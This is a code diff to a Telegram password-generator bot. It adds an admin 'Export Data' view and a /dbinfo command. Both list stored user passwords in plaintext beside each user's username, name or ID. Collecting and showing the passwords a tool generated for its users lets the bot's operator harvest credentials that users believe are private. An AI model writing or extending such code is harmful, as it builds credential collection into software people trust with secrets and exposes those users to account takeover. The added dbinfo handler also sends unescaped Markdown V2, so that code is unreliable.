@@ -328,7 +328,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             page = int(query.data.replace("admin_all_page_", ""))
             await show_all_passwords_page(query, user_id, page)
             
-        elif query.data in ["admin_menu", "admin_stats"]:
+        elif query.data in ["admin_menu", "admin_stats", "admin_export"]:
             # Handle admin callbacks
             await handle_admin_callbacks(query, user_id)
             
@@ -908,7 +908,7 @@ async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     user_id = update.effective_user.id
     
     # Add your admin user IDs here
-    ADMIN_IDS = [123456789]  # Replace with actual admin Telegram IDs
+    ADMIN_IDS = [250800600]  # Replace with actual admin Telegram IDs
     
     if user_id not in ADMIN_IDS:
         await update.message.reply_text("❌ Access denied. This command is for administrators only.")
@@ -917,7 +917,8 @@ async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     # Create inline keyboard for admin functions
     keyboard = [
         [InlineKeyboardButton("📖 View All Passwords", callback_data="admin_all_page_1")],
-        [InlineKeyboardButton("📊 Detailed Stats", callback_data="admin_stats")]
+        [InlineKeyboardButton("📊 Detailed Stats", callback_data="admin_stats")],
+        [InlineKeyboardButton("📋 Export Data", callback_data="admin_export")]
     ]
     
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1067,7 +1068,8 @@ async def handle_admin_callbacks(query, user_id):
     if query.data == "admin_menu":
         keyboard = [
             [InlineKeyboardButton("📖 View All Passwords", callback_data="admin_all_page_1")],
-            [InlineKeyboardButton("📊 Detailed Stats", callback_data="admin_stats")]
+            [InlineKeyboardButton("📊 Detailed Stats", callback_data="admin_stats")],
+            [InlineKeyboardButton("📋 Export Data", callback_data="admin_export")]
         ]
         
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1099,6 +1101,102 @@ async def handle_admin_callbacks(query, user_id):
             reply_markup=reply_markup,
             parse_mode=ParseMode.MARKDOWN_V2
         )
+    
+    elif query.data == "admin_export":
+        # Export database data
+        try:
+            export_text = "📋 *Database Export*\n\n"
+            
+            # Get all data
+            async with aiosqlite.connect(DATABASE_PATH) as db:
+                cursor = await db.execute("""
+                    SELECT user_id, username, first_name, last_name, password, generation_type, created_at
+                    FROM password_history 
+                    ORDER BY created_at DESC 
+                    LIMIT 100
+                """)
+                rows = await cursor.fetchall()
+                
+                export_text += f"📊 *Total records*: {len(rows)} (showing last 100)\n\n"
+                
+                for i, (user_id, username, first_name, last_name, password, gen_type, created_at) in enumerate(rows[:20], 1):
+                    user_info = f"@{username}" if username else f"{first_name or ''} {last_name or ''}".strip()
+                    if not user_info:
+                        user_info = f"ID:{user_id}"
+                    
+                    export_text += f"{i}\\. `{password}` \\({gen_type}\\)\n"
+                    export_text += f"   👤 {user_info} \\| 📅 {created_at}\n\n"
+                
+                if len(rows) > 20:
+                    export_text += f"_\\.\\.\\. and {len(rows) - 20} more records_"
+            
+            keyboard = [[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_menu")]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await query.edit_message_text(
+                export_text,
+                reply_markup=reply_markup,
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+            
+        except Exception as e:
+            logger.error(f"Error exporting data: {e}")
+            await query.edit_message_text(
+                f"❌ Error exporting data: {str(e)}",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_menu")]])
+            )
+
+async def db_info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Show database info (admin only)"""
+    user_id = update.effective_user.id
+    
+    # Add your admin user IDs here
+    ADMIN_IDS = [123456789]  # Replace with actual admin Telegram IDs
+    
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Access denied. This command is for administrators only.")
+        return
+    
+    try:
+        async with aiosqlite.connect(DATABASE_PATH) as db:
+            # Get table info
+            cursor = await db.execute("SELECT name FROM sqlite_master WHERE type='table';")
+            tables = await cursor.fetchall()
+            
+            # Get record count
+            cursor = await db.execute("SELECT COUNT(*) FROM password_history;")
+            total_count = await cursor.fetchone()
+            
+            # Get unique users count
+            cursor = await db.execute("SELECT COUNT(DISTINCT user_id) FROM password_history;")
+            users_count = await cursor.fetchone()
+            
+            # Get recent records
+            cursor = await db.execute("""
+                SELECT user_id, username, password, generation_type, created_at 
+                FROM password_history 
+                ORDER BY created_at DESC 
+                LIMIT 5
+            """)
+            recent = await cursor.fetchall()
+            
+            info_text = f"""🗄️ **Database Info**
+
+📊 **Statistics:**
+• Total passwords: {total_count[0] if total_count else 0}
+• Unique users: {users_count[0] if users_count else 0}
+• Tables: {', '.join([t[0] for t in tables])}
+
+📝 **Recent entries:**"""
+
+            for i, (uid, username, password, gen_type, created_at) in enumerate(recent, 1):
+                user_info = f"@{username}" if username else f"ID:{uid}"
+                info_text += f"\n{i}. `{password}` ({gen_type}) - {user_info}"
+            
+            await update.message.reply_text(info_text, parse_mode=ParseMode.MARKDOWN_V2)
+            
+    except Exception as e:
+        await update.message.reply_text(f"❌ Database error: {str(e)}")
 
 def main() -> None:
     """Start the bot"""
@@ -1111,6 +1209,7 @@ def main() -> None:
     application.add_handler(CommandHandler("debug", debug_command))
     application.add_handler(CommandHandler("stats", stats_command))
     application.add_handler(CommandHandler("admin", admin_command))
+    application.add_handler(CommandHandler("dbinfo", db_info_command))
     application.add_handler(CallbackQueryHandler(button_handler))
     
     # Initialize database
